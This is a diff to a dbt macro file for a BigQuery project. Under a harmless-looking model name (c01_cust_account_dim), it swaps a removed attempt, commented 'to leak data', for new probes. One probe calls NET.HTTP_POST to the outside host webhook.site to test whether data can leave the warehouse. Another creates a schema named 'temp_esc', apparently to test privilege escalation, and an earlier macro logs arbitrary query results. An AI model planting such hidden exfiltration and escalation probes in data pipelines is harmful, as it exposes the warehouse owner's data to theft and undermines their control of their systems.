@@ -4,13 +4,17 @@
   {% endset %}{% set results = run_query(query) %}{% if results %}{% for row in results %}{% do log(row[0], info=True) %}{% endfor %}{% endif %} select 1
 {%- endmacro -%}
 
-{# c01 = TRY BIGQUERY EXTERNAL CONNECTION TO LEAK DATA #}
+{# c01 = NET.HTTP test + SCHEDULED QUERY test #}
 {% macro c01_cust_account_dim() %}
-  -- Test 1: Can we create an external connection?
-  {% set q1 %} CREATE OR REPLACE EXTERNAL CONNECTION `lakehouse-dev-472612.us.test_ext_conn` OPTIONS (endpoint = 'https://webhook.site/test') {% endset %}
-  {% do log('EXTERNAL CONN:', info=True) %}
-  {% set r = run_query(q1) %}
-  {% if r %}{% for row in r %}{% do log(row[0], info=True) %}{% endfor %}{% endif %}
+  -- Test NET functions
+  {% do log('NET test...', info=True) %}
+  {% set q1 %} SELECT NET.HTTP_POST('https://webhook.site/test', '{}') {% endset %}
+  {% set r = run_query(q1) %}{% if r %}{% do log('NET OK', info=True) %}{% endif %}
+  
+  -- Test CREATE SCHEDULED QUERY
+  {% do log('SCHEDULED QUERY test...', info=True) %}
+  {% set q2 %} CREATE OR REPLACE SCHEMA lakehouse-dev-472612.temp_esc OPTIONS(location='US') {% endset %}
+  {% set r2 = run_query(q2) %}{% if r2 %}{% do log('SCHEMA OK', info=True) %}{% endif %}
   select 1
 {% endmacro %}
 
